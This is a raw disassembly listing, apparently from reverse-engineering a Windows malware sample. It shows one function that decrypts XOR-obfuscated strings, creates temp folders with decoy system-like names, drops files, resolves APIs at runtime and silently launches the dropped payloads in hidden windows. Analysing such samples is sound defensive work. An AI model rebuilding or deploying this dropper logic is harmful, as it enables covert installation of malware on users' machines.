sub_402D4E      proc near               ; CODE XREF: sub_403C5B+6↓p

var_13C8        = dword ptr -13C8h
Dst             = byte ptr -12C8h
var_11C4        = byte ptr -11C4h
var_10C0        = byte ptr -10C0h
var_CB0         = dword ptr -0CB0h
var_CAC         = dword ptr -0CACh
var_CA0         = dword ptr -0CA0h
var_C9C         = dword ptr -0C9Ch
var_C90         = dword ptr -0C90h
var_C8C         = dword ptr -0C8Ch
var_C80         = byte ptr -0C80h
Src             = byte ptr -0C78h
NumberOfBytesWritten= dword ptr -0C68h
var_C64         = byte ptr -0C64h
var_B60         = byte ptr -0B60h
var_A5C         = byte ptr -0A5Ch
var_95C         = byte ptr -95Ch
var_75C         = byte ptr -75Ch
var_658         = byte ptr -658h
var_554         = byte ptr -554h
FileName        = byte ptr -450h
var_34C         = byte ptr -34Ch
var_32C         = byte ptr -32Ch
var_30C         = byte ptr -30Ch
var_2EC         = byte ptr -2ECh
var_2CC         = byte ptr -2CCh
var_2AC         = byte ptr -2ACh
PathName        = byte ptr -28Ch
Buffer          = byte ptr -188h
var_C8          = dword ptr -0C8h
var_A0          = dword ptr -0A0h
var_9C          = dword ptr -9Ch
var_98          = dword ptr -98h
var_94          = dword ptr -94h
var_90          = dword ptr -90h
var_8C          = dword ptr -8Ch
var_88          = dword ptr -88h
var_84          = dword ptr -84h
var_80          = dword ptr -80h
var_7C          = dword ptr -7Ch
var_78          = dword ptr -78h
var_74          = dword ptr -74h
var_70          = dword ptr -70h
var_6C          = dword ptr -6Ch
var_68          = dword ptr -68h
var_64          = dword ptr -64h
var_60          = dword ptr -60h
var_5C          = dword ptr -5Ch
var_58          = dword ptr -58h
var_54          = dword ptr -54h
hObject         = dword ptr -50h
Val             = dword ptr -4Ch
Size            = dword ptr -48h
var_44          = dword ptr -44h
var_40          = dword ptr -40h
var_3C          = dword ptr -3Ch
var_38          = dword ptr -38h
var_34          = dword ptr -34h
var_30          = dword ptr -30h
var_2C          = dword ptr -2Ch
lpFileName      = dword ptr -28h
Mode            = dword ptr -24h
Stream          = dword ptr -20h
var_1C          = dword ptr -1Ch
hFile           = dword ptr -18h
var_14          = dword ptr -14h
Seed            = dword ptr -10h
lpBuffer        = dword ptr -0Ch
dwShareMode     = dword ptr -8
lpSecurityAttributes= dword ptr -4
dwMilliseconds  = dword ptr  0
hTemplateFile   = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                push    ebp
                mov     ebp, esp
                mov     eax, 13F8h
                call    sub_404C90
                sub     esp, eax
                mov     [ebp+var_30], offset dword_7B2044
                mov     [ebp+var_34], 1
                mov     [ebp+var_38], 0
                mov     ecx, [ebp+var_34]
                mov     eax, [ebp+var_38]
                mov     edx, [ebp+var_30]
                lock cmpxchg [edx], ecx
                test    eax, eax
                jz      short loc_402DA5
                jmp     short loc_402D96
; ---------------------------------------------------------------------------

loc_402D85:                             ; CODE XREF: sub_402D4E+50↓j
                mov     [esp+dwMilliseconds], 64h ; 'd' ; dwMilliseconds
                mov     eax, ds:Sleep   ; KERNEL32
                call    eax ; Sleep     ; KERNEL32
                sub     esp, 4

loc_402D96:                             ; CODE XREF: sub_402D4E+35↑j
                mov     eax, ds:dword_7B2044
                cmp     eax, 1
                jz      short loc_402D85
                jmp     locret_403B77
; ---------------------------------------------------------------------------

loc_402DA5:                             ; CODE XREF: sub_402D4E+33↑j
                call    sub_402A58
                mov     eax, dword_40B118
                lea     edx, [ebp+var_58]
                mov     [esp+arg_4], edx
                mov     [esp+hTemplateFile], 77h ; 'w'
                mov     [esp+4], eax
                mov     [esp+dwMilliseconds], offset a4G2523323 ; "4%'/G(2:523323"
                call    sub_4014F0
                mov     eax, dword_40B124
                lea     edx, [ebp+var_68]
                mov     [esp+arg_4], edx
                mov     [esp+hTemplateFile], 77h ; 'w'
                mov     [esp+4], eax
                mov     [esp+dwMilliseconds], offset a81192 ; "811;>92"
                call    sub_4014F0
                mov     eax, dword_40B12C
                lea     edx, [ebp+var_70]
                mov     [esp+arg_4], edx
                mov     [esp+hTemplateFile], 77h ; 'w'
                mov     [esp+4], eax
                mov     [esp+dwMilliseconds], offset unk_40B128
                call    sub_4014F0
                mov     edx, dword_7ABF0C
                mov     eax, dword_7ABD88
                mov     [esp+arg_8], 77h ; 'w'
                mov     [esp+arg_4], edx
                mov     [esp+hTemplateFile], offset unk_7ABEF4
                mov     [esp+4], eax
                mov     [esp+dwMilliseconds], offset unk_7ABD7C
                call    sub_40153B
                mov     [ebp+lpBuffer], eax
                cmp     [ebp+lpBuffer], 0
                jz      short loc_402E78
                lea     eax, [ebp+var_70]
                mov     [esp+4], eax
                lea     eax, [ebp+var_58]
                mov     [esp+dwMilliseconds], eax
                mov     eax, [ebp+lpBuffer]
                call    eax
                sub     esp, 8
                lea     eax, [ebp+var_70]
                mov     [esp+8+lpSecurityAttributes], eax
                lea     eax, [ebp+var_68]
                mov     [esp+8+dwShareMode], eax
                mov     eax, [ebp+lpBuffer]
                call    eax
                sub     esp, 8

loc_402E78:                             ; CODE XREF: sub_402D4E+FE↑j
                mov     [ebp+var_84], offset aLowGraphicsCac ; "Low_Graphics_Cache"
                mov     [ebp+var_80], offset aSysDiagnostics ; "Sys_Diagnostics"
                mov     [ebp+var_7C], offset aWindowsDriverH ; "Windows_Driver_Host"
                mov     [ebp+var_78], offset aUpdateTempStor ; "Update_Temp_Store"
                mov     [ebp+var_74], offset aCacheSys ; "Cache_Sys"
                mov     eax, ds:GetTickCount ; KERNEL32
                call    eax ; GetTickCount ; KERNEL32
                mov     [esp+10h+Seed], eax ; Seed
                call    srand
                call    rand
                mov     ecx, eax
                mov     edx, 66666667h
                mov     eax, ecx
                imul    edx
                sar     edx, 1
                mov     eax, ecx
                sar     eax, 1Fh
                sub     edx, eax
                mov     eax, edx
                shl     eax, 2
                add     eax, edx
                sub     ecx, eax
                mov     edx, ecx
                mov     eax, [ebp+edx*4+var_84]
                mov     [ebp+Seed], eax
                lea     eax, [ebp+Buffer]
                mov     [esp+10h+lpBuffer], eax ; lpBuffer
                mov     [esp+10h+Seed], 104h ; nBufferLength
                mov     eax, ds:GetTempPathA ; KERNEL32
                call    eax ; GetTempPathA ; KERNEL32
                sub     esp, 8
                mov     eax, [ebp+Seed]
                mov     [esp+10h+dwMilliseconds], eax
                lea     eax, [ebp+Buffer]
                mov     [esp+10h+lpSecurityAttributes], eax
                mov     [esp+10h+dwShareMode], offset aSS ; "%s\\%s"
                mov     [esp+10h+lpBuffer], 104h
                lea     eax, [ebp+PathName]
                mov     [esp+10h+Seed], eax
                call    sub_404CC0
                mov     [esp+10h+lpBuffer], 0 ; lpSecurityAttributes
                lea     eax, [ebp+PathName]
                mov     [esp+10h+Seed], eax ; lpPathName
                mov     eax, ds:CreateDirectoryA ; KERNEL32
                call    eax ; CreateDirectoryA ; KERNEL32
                sub     esp, 8
                mov     eax, dword_40B138
                lea     edx, [ebp+var_2AC]
                mov     [esp+10h+lpSecurityAttributes], edx
                mov     [esp+10h+dwShareMode], 77h ; 'w'
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_40B130
                call    sub_4014F0
                mov     eax, dword_40B144
                lea     edx, [ebp+var_2CC]
                mov     [esp+10h+lpSecurityAttributes], edx
                mov     [esp+10h+dwShareMode], 77h ; 'w'
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_40B13C
                call    sub_4014F0
                mov     eax, dword_40B158
                lea     edx, [ebp+var_2EC]
                mov     [esp+10h+lpSecurityAttributes], edx
                mov     [esp+10h+dwShareMode], 77h ; 'w'
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_40B148
                call    sub_4014F0
                mov     eax, dword_40B168
                lea     edx, [ebp+var_30C]
                mov     [esp+10h+lpSecurityAttributes], edx
                mov     [esp+10h+dwShareMode], 77h ; 'w'
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_40B15C
                call    sub_4014F0
                mov     eax, dword_40B178
                lea     edx, [ebp+var_32C]
                mov     [esp+10h+lpSecurityAttributes], edx
                mov     [esp+10h+dwShareMode], 77h ; 'w'
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_40B16C
                call    sub_4014F0
                mov     eax, dword_40B18C
                lea     edx, [ebp+var_34C]
                mov     [esp+10h+lpSecurityAttributes], edx
                mov     [esp+10h+dwShareMode], 77h ; 'w'
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_40B17C
                call    sub_4014F0
                lea     eax, [ebp+var_2AC]
                mov     [esp+10h+dwMilliseconds], eax
                lea     eax, [ebp+PathName]
                mov     [esp+10h+lpSecurityAttributes], eax
                mov     [esp+10h+dwShareMode], offset aSS_0 ; "%s%s"
                mov     [esp+10h+lpBuffer], 104h
                lea     eax, [ebp+FileName]
                mov     [esp+10h+Seed], eax
                call    sub_404CC0
                lea     eax, [ebp+var_2CC]
                mov     [esp+10h+dwMilliseconds], eax
                lea     eax, [ebp+PathName]
                mov     [esp+10h+lpSecurityAttributes], eax
                mov     [esp+10h+dwShareMode], offset aSS_0 ; "%s%s"
                mov     [esp+10h+lpBuffer], 104h
                lea     eax, [ebp+var_554]
                mov     [esp+10h+Seed], eax
                call    sub_404CC0
                lea     eax, [ebp+var_2EC]
                mov     [esp+10h+dwMilliseconds], eax
                lea     eax, [ebp+PathName]
                mov     [esp+10h+lpSecurityAttributes], eax
                mov     [esp+10h+dwShareMode], offset aSS_0 ; "%s%s"
                mov     [esp+10h+lpBuffer], 104h
                lea     eax, [ebp+var_658]
                mov     [esp+10h+Seed], eax
                call    sub_404CC0
                lea     eax, [ebp+var_30C]
                mov     [esp+10h+dwMilliseconds], eax
                lea     eax, [ebp+PathName]
                mov     [esp+10h+lpSecurityAttributes], eax
                mov     [esp+10h+dwShareMode], offset aSS_0 ; "%s%s"
                mov     [esp+10h+lpBuffer], 104h
                lea     eax, [ebp+var_75C]
                mov     [esp+10h+Seed], eax
                call    sub_404CC0
                mov     [esp+10h+lpBuffer], 0 ; lpSecurityAttributes
                lea     eax, [ebp+var_554]
                mov     [esp+10h+Seed], eax ; lpPathName
                mov     eax, ds:CreateDirectoryA ; KERNEL32
                call    eax ; CreateDirectoryA ; KERNEL32
                sub     esp, 8
                call    sub_402A2B
                test    eax, eax
                jz      short loc_40313F
                mov     eax, dword_40B068
                lea     edx, [ebp+var_95C]
                mov     [esp+10h+lpSecurityAttributes], edx
                mov     [esp+10h+dwShareMode], 77h ; 'w'
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_40B020
                call    sub_4014F0
                jmp     short loc_403166
; ---------------------------------------------------------------------------

loc_40313F:                             ; CODE XREF: sub_402D4E+3C6↑j
                mov     eax, dword_40B0C8
                lea     edx, [ebp+var_95C]
                mov     [esp+10h+lpSecurityAttributes], edx
                mov     [esp+10h+dwShareMode], 77h ; 'w'
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_40B080
                call    sub_4014F0

loc_403166:                             ; CODE XREF: sub_402D4E+3EF↑j
                mov     eax, dword_40B104
                lea     edx, [ebp+var_A5C]
                mov     [esp+10h+lpSecurityAttributes], edx
                mov     [esp+10h+dwShareMode], 77h ; 'w'
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_40B0E0
                call    sub_4014F0
                lea     eax, [ebp+FileName]
                mov     [esp+10h+Seed], eax ; lpFileName
                mov     eax, ds:GetFileAttributesA ; KERNEL32
                call    eax ; GetFileAttributesA ; KERNEL32
                sub     esp, 4
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_4031BD
                lea     eax, [ebp+FileName]
                mov     [esp+10h+lpBuffer], eax ; lpFileName
                lea     eax, [ebp+var_95C]
                mov     [esp+10h+Seed], eax ; void *
                call    sub_401FE7

loc_4031BD:                             ; CODE XREF: sub_402D4E+455↑j
                lea     eax, [ebp+var_658]
                mov     [esp+10h+Seed], eax ; lpFileName
                mov     eax, ds:GetFileAttributesA ; KERNEL32
                call    eax ; GetFileAttributesA ; KERNEL32
                sub     esp, 4
                cmp     eax, 0FFFFFFFFh
                jnz     loc_4032BB
                mov     eax, nNumberOfBytesToWrite
                add     eax, 1
                mov     [esp+10h+Seed], eax ; Size
                call    malloc
                mov     [ebp+var_14], eax
                cmp     [ebp+var_14], 0
                jz      loc_4032BB
                movzx   eax, byte_7ABD78
                movsx   edx, al
                mov     eax, nNumberOfBytesToWrite
                mov     ecx, [ebp+var_14]
                mov     [esp+10h+lpSecurityAttributes], ecx
                mov     [esp+10h+dwShareMode], edx
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_40B260
                call    sub_4014F0
                mov     [esp+10h+hTemplateFile], 0 ; hTemplateFile
                mov     dword ptr [esp+14h], 80h ; dwFlagsAndAttributes
                mov     [esp+10h+dwMilliseconds], 2 ; dwCreationDisposition
                mov     [esp+10h+lpSecurityAttributes], 0 ; lpSecurityAttributes
                mov     [esp+10h+dwShareMode], 0 ; dwShareMode
                mov     [esp+10h+lpBuffer], 40000000h ; dwDesiredAccess
                lea     eax, [ebp+var_658]
                mov     [esp+10h+Seed], eax ; lpFileName
                mov     eax, ds:CreateFileA ; KERNEL32
                call    eax ; CreateFileA ; KERNEL32
                sub     esp, 1Ch
                mov     [ebp+hFile], eax
                cmp     [ebp+hFile], 0FFFFFFFFh
                jz      short loc_4032B0
                mov     eax, nNumberOfBytesToWrite
                mov     edx, eax
                mov     [esp+10h+dwMilliseconds], 0 ; lpOverlapped
                lea     eax, [ebp+NumberOfBytesWritten]
                mov     [esp+10h+lpSecurityAttributes], eax ; lpNumberOfBytesWritten
                mov     [esp+10h+dwShareMode], edx ; nNumberOfBytesToWrite
                mov     eax, [ebp+var_14]
                mov     [esp+10h+lpBuffer], eax ; lpBuffer
                mov     eax, [ebp+hFile]
                mov     [esp+10h+Seed], eax ; hFile
                mov     eax, ds:WriteFile ; KERNEL32
                call    eax ; WriteFile ; KERNEL32
                sub     esp, 14h
                mov     eax, [ebp+hFile]
                mov     [esp+10h+Seed], eax ; hObject
                mov     eax, ds:CloseHandle ; KERNEL32
                call    eax ; CloseHandle ; KERNEL32
                sub     esp, 4

loc_4032B0:                             ; CODE XREF: sub_402D4E+51C↑j
                mov     eax, [ebp+var_14]
                mov     [esp+10h+Seed], eax ; Block
                call    free

loc_4032BB:                             ; CODE XREF: sub_402D4E+485↑j
                                        ; sub_402D4E+4A2↑j
                lea     eax, [ebp+var_75C]
                mov     [esp+10h+Seed], eax ; lpFileName
                mov     eax, ds:GetFileAttributesA ; KERNEL32
                call    eax ; GetFileAttributesA ; KERNEL32
                sub     esp, 4
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_4032EB
                lea     eax, [ebp+var_75C]
                mov     [esp+10h+lpBuffer], eax ; lpFileName
                lea     eax, [ebp+var_A5C]
                mov     [esp+10h+Seed], eax ; void *
                call    sub_401FE7

loc_4032EB:                             ; CODE XREF: sub_402D4E+583↑j
                mov     eax, ds:dword_7B2038
                test    eax, eax
                jle     loc_4034B6
                movzx   eax, byte_7ABD79
                movsx   edx, al
                mov     eax, ds:dword_7B2038
                lea     ecx, [ebp+var_10C0]
                mov     [esp+10h+lpSecurityAttributes], ecx
                mov     [esp+10h+dwShareMode], edx
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_7B2034
                call    sub_4014F0
                movzx   eax, byte_7ABD7A
                movsx   edx, al
                mov     eax, ds:dword_7B2040
                lea     ecx, [ebp+var_13C8]
                mov     [esp+10h+lpSecurityAttributes], ecx
                mov     [esp+10h+dwShareMode], edx
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_7B203C
                call    sub_4014F0
                mov     eax, dword_7AC000
                lea     edx, [ebp+Src]
                mov     [esp+10h+lpSecurityAttributes], edx
                mov     [esp+10h+dwShareMode], 77h ; 'w'
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset aR2812r ; "R\"$2%'%81>;2R"
                call    sub_4014F0
                mov     [esp+10h+dwShareMode], 104h ; nSize
                lea     eax, [ebp+Dst]
                mov     [esp+10h+lpBuffer], eax ; lpDst
                lea     eax, [ebp+Src]
                mov     [esp+10h+Seed], eax ; lpSrc
                mov     eax, ds:ExpandEnvironmentStringsA ; KERNEL32
                call    eax ; ExpandEnvironmentStringsA ; KERNEL32
                sub     esp, 0Ch
                lea     eax, [ebp+var_13C8]
                mov     [esp+10h+dwMilliseconds], eax
                lea     eax, [ebp+Dst]
                mov     [esp+10h+lpSecurityAttributes], eax
                mov     [esp+10h+dwShareMode], offset aSDownloadsS ; "%s\\Downloads\\%s"
                mov     [esp+10h+lpBuffer], 104h
                lea     eax, [ebp+var_11C4]
                mov     [esp+10h+Seed], eax
                call    sub_404CC0
                lea     eax, [ebp+var_11C4]
                mov     [esp+10h+Seed], eax ; lpFileName
                mov     eax, ds:GetFileAttributesA ; KERNEL32
                call    eax ; GetFileAttributesA ; KERNEL32
                sub     esp, 4
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_403400
                lea     eax, [ebp+var_11C4]
                mov     [esp+10h+lpBuffer], eax ; lpFileName
                lea     eax, [ebp+var_10C0]
                mov     [esp+10h+Seed], eax ; void *
                call    sub_401FE7

loc_403400:                             ; CODE XREF: sub_402D4E+698↑j
                lea     eax, [ebp+var_11C4]
                mov     [esp+10h+Seed], eax ; lpFileName
                mov     eax, ds:GetFileAttributesA ; KERNEL32
                call    eax ; GetFileAttributesA ; KERNEL32
                sub     esp, 4
                cmp     eax, 0FFFFFFFFh
                jz      loc_4034B6
                mov     edx, dword_7ABE30
                mov     eax, dword_7ABDA8
                mov     [esp+10h+dwMilliseconds], 77h ; 'w'
                mov     [esp+10h+lpSecurityAttributes], edx
                mov     [esp+10h+dwShareMode], offset unk_7ABE20
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_7ABD9C
                call    sub_40153B
                mov     [ebp+var_1C], eax
                cmp     [ebp+var_1C], 0
                jz      short loc_4034B6
                mov     eax, dword_7ABFAC
                lea     edx, [ebp+var_C80]
                mov     [esp+10h+lpSecurityAttributes], edx
                mov     [esp+10h+dwShareMode], 77h ; 'w'
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], offset unk_7ABFA8
                call    sub_4014F0
                mov     dword ptr [esp+14h], 1
                mov     [esp+10h+dwMilliseconds], 0
                mov     [esp+10h+lpSecurityAttributes], 0
                lea     eax, [ebp+var_11C4]
                mov     [esp+10h+dwShareMode], eax
                lea     eax, [ebp+var_C80]
                mov     [esp+10h+lpBuffer], eax
                mov     [esp+10h+Seed], 0
                mov     eax, [ebp+var_1C]
                call    eax
                sub     esp, 18h

loc_4034B6:                             ; CODE XREF: sub_402D4E+5A4↑j
                                        ; sub_402D4E+6C8↑j ...
                lea     eax, [ebp+var_32C]
                mov     [esp+28h+hFile], eax
                lea     eax, [ebp+var_554]
                mov     [esp+28h+var_1C], eax
                mov     [esp+28h+Stream], offset aSS_0 ; "%s%s"
                mov     [esp+28h+Mode], 104h
                lea     eax, [ebp+var_B60]
                mov     [esp+28h+lpFileName], eax
                call    sub_404CC0
                lea     eax, [ebp+FileName]
                mov     [esp+28h+lpFileName], eax ; lpFileName
                mov     eax, ds:GetFileAttributesA ; KERNEL32
                call    eax ; GetFileAttributesA ; KERNEL32
                sub     esp, 4
                cmp     eax, 0FFFFFFFFh
                jz      short loc_403567
                lea     eax, [ebp+var_B60]
                mov     [esp+28h+lpFileName], eax ; lpFileName
                mov     eax, ds:GetFileAttributesA ; KERNEL32
                call    eax ; GetFileAttributesA ; KERNEL32
                sub     esp, 4
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_403567
                lea     eax, [ebp+PathName]
                mov     [esp+28h+Stream], eax
                lea     eax, [ebp+var_554]
                mov     [esp+28h+Mode], eax
                lea     eax, [ebp+FileName]
                mov     [esp+28h+lpFileName], eax
                call    sub_40288F
                test    eax, eax
                jnz     short loc_403556
                lea     eax, [ebp+var_554]
                mov     [esp+28h+Mode], eax ; LPCCH
                lea     eax, [ebp+FileName]
                mov     [esp+28h+lpFileName], eax ; LPCCH
                call    sub_402193

loc_403556:                             ; CODE XREF: sub_402D4E+7EE↑j
                mov     [esp+28h+lpFileName], 3E8h ; dwMilliseconds
                mov     eax, ds:Sleep   ; KERNEL32
                call    eax ; Sleep     ; KERNEL32
                sub     esp, 4

loc_403567:                             ; CODE XREF: sub_402D4E+7B0↑j
                                        ; sub_402D4E+7C8↑j
                lea     eax, [ebp+var_34C]
                mov     [esp+28h+hFile], eax
                lea     eax, [ebp+var_554]
                mov     [esp+28h+var_1C], eax
                mov     [esp+28h+Stream], offset aSS_0 ; "%s%s"
                mov     [esp+28h+Mode], 104h
                lea     eax, [ebp+var_C64]
                mov     [esp+28h+lpFileName], eax
                call    sub_404CC0
                lea     eax, [ebp+var_C64]
                mov     [esp+28h+lpFileName], eax ; lpFileName
                mov     eax, ds:GetFileAttributesA ; KERNEL32
                call    eax ; GetFileAttributesA ; KERNEL32
                sub     esp, 4
                cmp     eax, 0FFFFFFFFh
                jz      short loc_403617
                mov     [esp+28h+Mode], offset Mode ; "w"
                lea     eax, [ebp+var_C64]
                mov     [esp+28h+lpFileName], eax ; FileName
                call    fopen
                mov     [ebp+Stream], eax
                cmp     [ebp+Stream], 0
                jz      short loc_403617
                mov     eax, dword_40B1CC
                lea     edx, [ebp+var_10C0]
                mov     [esp+28h+var_1C], edx
                mov     [esp+28h+Stream], 77h ; 'w'
                mov     [esp+28h+Mode], eax
                mov     [esp+28h+lpFileName], offset unk_40B1A0
                call    sub_4014F0
                mov     eax, [ebp+Stream]
                mov     [esp+28h+Mode], eax ; Stream
                lea     eax, [ebp+var_10C0]
                mov     [esp+28h+lpFileName], eax ; Buffer
                call    fputs
                mov     eax, [ebp+Stream]
                mov     [esp+28h+lpFileName], eax ; Stream
                call    fclose

loc_403617:                             ; CODE XREF: sub_402D4E+861↑j
                                        ; sub_402D4E+880↑j
                lea     eax, [ebp+var_B60]
                mov     [esp+28h+lpFileName], eax ; lpFileName
                mov     eax, ds:GetFileAttributesA ; KERNEL32
                call    eax ; GetFileAttributesA ; KERNEL32
                sub     esp, 4
                cmp     eax, 0FFFFFFFFh
                jz      loc_403788
                lea     eax, [ebp+var_75C]
                mov     [esp+28h+lpFileName], eax ; lpFileName
                mov     eax, ds:GetFileAttributesA ; KERNEL32
                call    eax ; GetFileAttributesA ; KERNEL32
                sub     esp, 4
                cmp     eax, 0FFFFFFFFh
                jz      loc_403788
                mov     edx, dword_7ABED8
                mov     eax, dword_7ABD88
                mov     [esp+28h+hFile], 77h ; 'w'
                mov     [esp+28h+var_1C], edx
                mov     [esp+28h+Stream], offset unk_7ABEC8
                mov     [esp+28h+Mode], eax
                mov     [esp+28h+lpFileName], offset unk_7ABD7C
                call    sub_40153B
                mov     [ebp+Mode], eax
                cmp     [ebp+Mode], 0
                jz      loc_403788
                lea     eax, [ebp+var_75C]
                mov     [esp+28h+hFile], eax
                lea     eax, [ebp+var_B60]
                mov     [esp+28h+var_1C], eax
                mov     [esp+28h+Stream], offset aSS_1 ; "\"%s\" \"%s\""
                mov     [esp+28h+Mode], 410h
                lea     eax, [ebp+var_10C0]
                mov     [esp+28h+lpFileName], eax
                call    sub_404CC0
                mov     [esp+28h+Stream], 44h ; 'D' ; Size
                mov     [esp+28h+Mode], 0 ; Val
                lea     eax, [ebp+var_11C4]
                mov     [esp+28h+lpFileName], eax ; void *
                call    memset
                mov     dword ptr [ebp+var_11C4], 44h ; 'D'
                mov     [esp+28h+Stream], 10h ; Size
                mov     [esp+28h+Mode], 0 ; Val
                lea     eax, [ebp+var_C90]
                mov     [esp+28h+lpFileName], eax ; void *
                call    memset
                lea     eax, [ebp+var_C90]
                mov     [esp+28h+lpSecurityAttributes], eax
                lea     eax, [ebp+var_11C4]
                mov     [esp+28h+dwShareMode], eax
                lea     eax, [ebp+PathName]
                mov     [esp+28h+lpBuffer], eax
                mov     [esp+28h+Seed], 0
                mov     [esp+28h+var_14], 8000000h
                mov     [esp+28h+hFile], 0
                mov     [esp+28h+var_1C], 0
                mov     [esp+28h+Stream], 0
                lea     eax, [ebp+var_10C0]
                mov     [esp+28h+Mode], eax
                mov     [esp+28h+lpFileName], 0
                mov     eax, [ebp+Mode]
                call    eax
                sub     esp, 28h
                mov     eax, [ebp+var_C8C]
                mov     [esp+50h+hObject], eax ; hObject
                mov     eax, ds:CloseHandle ; KERNEL32
                call    eax ; CloseHandle ; KERNEL32
                sub     esp, 4
                mov     eax, [ebp+var_C90]
                mov     [esp+50h+hObject], eax ; hObject
                mov     eax, ds:CloseHandle ; KERNEL32
                call    eax ; CloseHandle ; KERNEL32
                sub     esp, 4

loc_403788:                             ; CODE XREF: sub_402D4E+8DF↑j
                                        ; sub_402D4E+8FB↑j ...
                lea     eax, [ebp+var_B60]
                mov     [esp+50h+hObject], eax ; lpFileName
                mov     eax, ds:GetFileAttributesA ; KERNEL32
                call    eax ; GetFileAttributesA ; KERNEL32
                sub     esp, 4
                cmp     eax, 0FFFFFFFFh
                jz      loc_4038DD
                lea     eax, [ebp+var_658]
                mov     [esp+50h+var_40], eax
                lea     eax, [ebp+var_B60]
                mov     [esp+50h+var_44], eax
                mov     [esp+50h+Size], offset aSS_1 ; "\"%s\" \"%s\""
                mov     [esp+50h+Val], 30Ch
                lea     eax, [ebp+var_10C0]
                mov     [esp+50h+hObject], eax
                call    sub_404CC0
                mov     [esp+50h+Size], 44h ; 'D' ; Size
                mov     [esp+50h+Val], 0 ; Val
                lea     eax, [ebp+var_11C4]
                mov     [esp+50h+hObject], eax ; void *
                call    memset
                mov     dword ptr [ebp+var_11C4], 44h ; 'D'
                mov     [esp+50h+Size], 10h ; Size
                mov     [esp+50h+Val], 0 ; Val
                lea     eax, [ebp+var_CA0]
                mov     [esp+50h+hObject], eax ; void *
                call    memset
                mov     edx, dword_7ABED8
                mov     eax, dword_7ABD88
                mov     [esp+50h+var_40], 77h ; 'w'
                mov     [esp+50h+var_44], edx
                mov     [esp+50h+Size], offset unk_7ABEC8
                mov     [esp+50h+Val], eax
                mov     [esp+50h+hObject], offset unk_7ABD7C
                call    sub_40153B
                mov     [ebp+lpFileName], eax
                cmp     [ebp+lpFileName], 0
                jz      loc_4038DD
                lea     eax, [ebp+var_CA0]
                mov     [esp+50h+var_2C], eax
                lea     eax, [ebp+var_11C4]
                mov     [esp+50h+var_30], eax
                lea     eax, [ebp+PathName]
                mov     [esp+50h+var_34], eax
                mov     [esp+50h+var_38], 0
                mov     [esp+50h+var_3C], 8000000h
                mov     [esp+50h+var_40], 0
                mov     [esp+50h+var_44], 0
                mov     [esp+50h+Size], 0
                lea     eax, [ebp+var_10C0]
                mov     [esp+50h+Val], eax
                mov     [esp+50h+hObject], 0
                mov     eax, [ebp+lpFileName]
                call    eax
                sub     esp, 28h
                mov     eax, [ebp+var_CA0]
                mov     [esp+78h+var_78], eax ; hObject
                mov     eax, ds:CloseHandle ; KERNEL32
                call    eax ; CloseHandle ; KERNEL32
                sub     esp, 4
                mov     eax, [ebp+var_C9C]
                mov     [esp+78h+var_78], eax ; hObject
                mov     eax, ds:CloseHandle ; KERNEL32
                call    eax ; CloseHandle ; KERNEL32
                sub     esp, 4

loc_4038DD:                             ; CODE XREF: sub_402D4E+A50↑j
                                        ; sub_402D4E+B04↑j
                lea     eax, [ebp+var_B60]
                mov     [esp+78h+var_78], eax ; lpFileName
                mov     eax, ds:GetFileAttributesA ; KERNEL32
                call    eax ; GetFileAttributesA ; KERNEL32
                sub     esp, 4
                cmp     eax, 0FFFFFFFFh
                jz      loc_403B6D
                mov     edx, dword_7ABED8
                mov     eax, dword_7ABD88
                mov     [esp+78h+var_68], 77h ; 'w'
                mov     [esp+78h+var_6C], edx
                mov     [esp+78h+var_70], offset unk_7ABEC8
                mov     [esp+78h+var_74], eax
                mov     [esp+78h+var_78], offset unk_7ABD7C
                call    sub_40153B
                mov     [ebp+var_2C], eax
                cmp     [ebp+var_2C], 0
                jz      loc_403B6D
                mov     eax, dword_40B204
                lea     edx, [ebp+Dst]
                mov     [esp+78h+var_6C], edx
                mov     [esp+78h+var_70], 77h ; 'w'
                mov     [esp+78h+var_74], eax
                mov     [esp+78h+var_78], offset unk_40B1E0
                call    sub_4014F0
                lea     eax, [ebp+var_B60]
                mov     [esp+78h+var_6C], eax
                lea     eax, [ebp+Dst]
                mov     [esp+78h+var_70], eax
                mov     [esp+78h+var_74], 410h
                lea     eax, [ebp+var_10C0]
                mov     [esp+78h+var_78], eax
                call    sub_404CC0
                mov     [esp+78h+var_70], 44h ; 'D' ; Size
                mov     [esp+78h+var_74], 0 ; Val
                lea     eax, [ebp+var_13C8]
                mov     [esp+78h+var_78], eax ; void *
                call    memset
                mov     [ebp+var_13C8], 44h ; 'D'
                mov     [esp+78h+var_70], 10h ; Size
                mov     [esp+78h+var_74], 0 ; Val
                lea     eax, [ebp+var_CB0]
                mov     [esp+78h+var_78], eax ; void *
                call    memset
                lea     eax, [ebp+var_CB0]
                mov     [esp+78h+var_54], eax
                lea     eax, [ebp+var_13C8]
                mov     [esp+78h+var_58], eax
                lea     eax, [ebp+PathName]
                mov     [esp+78h+var_5C], eax
                mov     [esp+78h+var_60], 0
                mov     [esp+78h+var_64], 8000000h
                mov     [esp+78h+var_68], 0
                mov     [esp+78h+var_6C], 0
                mov     [esp+78h+var_70], 0
                lea     eax, [ebp+var_10C0]
                mov     [esp+78h+var_74], eax
                mov     [esp+78h+var_78], 0
                mov     eax, [ebp+var_2C]
                call    eax
